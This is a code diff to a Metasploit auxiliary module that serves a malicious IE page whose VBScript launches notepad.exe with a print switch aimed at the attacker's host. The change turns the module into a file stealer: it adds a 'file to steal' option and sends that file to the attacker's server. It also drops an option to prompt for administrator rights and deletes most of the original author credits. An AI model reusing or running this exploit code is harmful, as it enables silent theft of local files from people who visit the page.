@@ -21,12 +21,6 @@ class Metasploit4 < Msf::Auxiliary
       'License'        => MSF_LICENSE,
       'Author'         =>
         [
-          'Robert Freeman', # IBM X-Force
-          'yuange', # twitter.com/yuange75
-          'Rik van Duijn', # twitter.com/rikvduijn
-          'Wesley Neelen', # security[at]forsec.nl
-          'GradiusX <francescomifsud[at]gmail.com>',
-          'b33f', # @FuzzySec
           'sinn3r'
         ],
       'References'     =>
@@ -46,7 +40,7 @@ class Metasploit4 < Msf::Auxiliary
 
       register_options(
         [
-           OptBool.new('TRYUAC', [true, 'Ask victim to start as Administrator', false]),
+           OptString.new('FILE', [true, 'The file to steal'])
         ], self.class )
 
   end
@@ -246,14 +240,7 @@ end function
   end
 
   def get_html
-
-    if datastore['TRYUAC']
-      tryuac = 'runas'
-    else
-      tryuac = 'open'
-    end
-
-    html = %Q|<!doctype html>
+    %Q|<!doctype html>
 <html>
 <meta http-equiv="X-UA-Compatible" content="IE=EmulateIE8" >
 <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
@@ -262,8 +249,8 @@ end function
 function runaaaa()
 On Error Resume Next
 
-set shell=createobject("Shell.Application")
-shell.ShellExecute "notepad.exe", "", "", "#{tryuac}", 0
+set shell = createobject("Shell.Application")
+shell.ShellExecute "notepad.exe", "/PT ""#{datastore['FILE']}"" ""http://#{datastore['SRVHOST'] || Rex::Socket.source_address}:#{datastore['SRVPORT']}/#{get_resource}""", "", "open", 0
 
 end function
 </script>
